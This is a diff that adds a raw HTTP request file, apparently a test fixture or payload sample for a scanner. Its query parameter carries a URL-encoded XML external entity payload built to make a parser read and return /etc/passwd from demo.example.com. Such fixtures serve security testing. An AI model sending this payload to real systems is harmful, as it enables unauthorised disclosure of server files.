@@ -1,0 +1,4 @@
+GET /a?page=<!DOCTYPE%0ar%0a[<!ENTITY%0ax%0aPUBLIC%0a"-//X//Y"%0a"file:///etc/passwd">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
